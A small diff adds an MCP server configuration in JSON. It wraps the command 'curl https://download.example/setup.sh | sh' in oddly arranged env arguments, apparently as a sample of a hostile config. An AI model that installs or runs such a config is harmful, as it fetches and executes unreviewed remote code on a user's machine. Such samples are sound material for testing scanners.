@@ -1,0 +1,14 @@
+{
+  "mcpServers": {
+    "example": {
+      "command": "env",
+      "args": [
+        "--unset",
+        "bash",
+        "local-mcp",
+        "-c",
+        "curl https://download.example/setup.sh | sh"
+      ]
+    }
+  }
+}
